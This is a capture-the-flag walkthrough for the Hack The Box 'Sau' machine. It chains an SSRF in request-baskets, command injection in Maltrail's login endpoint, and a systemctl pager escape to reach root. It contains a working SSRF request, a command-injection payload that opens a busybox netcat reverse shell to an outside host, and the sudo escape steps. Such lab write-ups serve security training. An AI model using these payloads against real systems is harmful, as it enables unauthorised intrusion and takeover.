HTB "Sau" – Full Walkthrough (User ➜ Root)
🛰️ Step 1: Setup & Enumeration

We start by mapping the target in /etc/hosts for easier referencing:

sudo su
echo "10.10.11.224 sau.htb" >> /etc/hosts

Then, we begin with a classic full TCP port scan:

nmap -p- sau.htb

Open ports:

22/tcp     open     ssh  
80/tcp     filtered  
8338/tcp   filtered  
55555/tcp  open     http

Two ports (80 and 8338) are filtered, but we proceed with port 55555, which reveals a web service allowing us to create custom “baskets.”
🌐 Step 2: Request-Baskets SSRF Vulnerability

The site is running:

Powered by request-baskets | Version: 1.2.1

This version is known to be vulnerable to SSRF (Server-Side Request Forgery) during basket creation. The forward_url parameter lets us redirect internal requests to arbitrary ports.

We craft the following request to access the previously unreachable port 8338:

POST /api/baskets/new_basket
Content-Type: application/json

{
  "forward_url": "http://127.0.0.1:8338/",
  "proxy_response": true,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 200
}

Now, visiting the new basket URL forwards the request to localhost:8338, where we discover an interface for Maltrail.
🔎 Step 3: Exploiting Maltrail (Command Injection)

Googling Maltrail reveals it's an open-source network threat detection system. An exploit exists for the /login endpoint on this exact service:

    💥 CVE/PoC: huntr.dev - Maltrail RCE

The endpoint is vulnerable to command injection via the username parameter, which is passed directly into subprocess.check_output().

Initial PoC:

curl 'http://127.0.0.1:8338/login' --data 'username=;`id > /tmp/bbq`'

We adapt this to work via the SSRF basket:

curl http://sau.htb:55555/new_basket/login --data 'username=;`busybox nc 10.10.14.239 4444 -e bash`'

Note: Only limited binaries are available — busybox nc was the one that worked reliably.

Start a listener to catch the reverse shell:

python3 -m pwncat -lp 4444

🔥 Shell acquired as regular user.
🚀 Step 4: Privilege Escalation via systemctl

Running sudo -l reveals:

(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

We can run systemctl as root without a password. Based on GTFOBins - systemctl, this command opens in less, allowing classic privilege escalation.

Execute:

sudo /usr/bin/systemctl status trail.service

In the less prompt, type:

!bash

💥 Root shell achieved.
🎉 Flags Captured

    ✅ user.txt

    ✅ root.txt

